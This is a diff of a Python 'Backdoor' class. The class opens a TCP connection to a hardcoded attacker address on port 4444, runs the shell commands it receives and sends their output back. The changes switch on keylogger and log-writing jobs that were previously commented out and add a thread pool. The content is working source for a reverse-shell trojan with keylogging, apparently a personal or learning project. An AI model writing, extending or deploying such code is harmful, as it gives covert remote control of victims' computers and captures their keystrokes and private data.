@@ -6,15 +6,13 @@
 # then the results will be sent back
 
 # Built-in Modules
+from queue import Queue
 import os
 import socket
 import base64
 import subprocess
 import threading
-
-# Third Party Modules
 import json
-from queue import Queue
 
 # User Defined Modules
 from Logger import Logger
@@ -22,8 +20,8 @@ from Logger import Logger
 
 class Backdoor:
 
-    NUMBER_OF_THREADS = 3
-    JOB_NUMBER = [1, 2, 3, 4, 5]
+    NUMBER_OF_THREADS = 4
+    JOB_NUMBER = [1, 2, 3]
     queue = Queue()
     Ip = "192.168.79.128"
     Port = 4444
@@ -34,6 +32,11 @@ class Backdoor:
         self.logger = Logger()
         self.create_workers()
         self.create_jobs()
+
+    # ****************** THREAD POOL ******************************************************************
+
+    # Thread pool pattern makes it easy to observe and manage threads
+    # Reduces the costs occur when creating and deleting threads
 
     def create_workers(self):
         for _ in range(self.NUMBER_OF_THREADS):
@@ -46,17 +49,18 @@ class Backdoor:
         while True:
             x = self.queue.get()
 
-            # if x == 1:
-            #     logger.key_logger()
-            # if x == 1:
-            #     logger.screen_logger()
-            # elif x == 3:
-            #     logger.send_logs()
-            if x == 2:
-                self.connect_to_server(self.Ip, self.Port)
+            if x == 1:
+                self.logger.key_logger()
+            elif x == 2:
+                self.logger.write_file()
+            if x == 3:
+                try:
+                    self.connect_to_server(self.Ip, self.Port)
+                    self.queue.put(5)
+                except Exception as msg:
+                    print(msg)
+            elif x == 5:
                 self.run()
-            # elif x == 3:
-            #     self.run()
 
             self.queue.task_done()
 
@@ -65,6 +69,8 @@ class Backdoor:
             self.queue.put(x)
         self.queue.join()
 
+    # ****************** THREAD POOL ******************************************************************
+
     def connect_to_server(self, ip, port):
         # TCP Connection
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -72,8 +78,10 @@ class Backdoor:
 
     # Execute given command string in shell
     def execute_system_command(self, command):
-        command_result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = command_result.stdout.read() + command_result.stderr.read()
+        command = " ".join(command)
+        task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = task.communicate()
+        output_byte = stdout + stderr
         output_str = output_byte.decode()
         return output_str
 
@@ -164,8 +172,7 @@ class Backdoor:
                 command_result = self.execute_system_command(command)
 
             # Send results of commands executed to the attacker
-            if len(command_result) > 0:
-                self.__send_data(command_result)
+            self.__send_data(command_result)
 
 
 # Connect to the attacker's computer
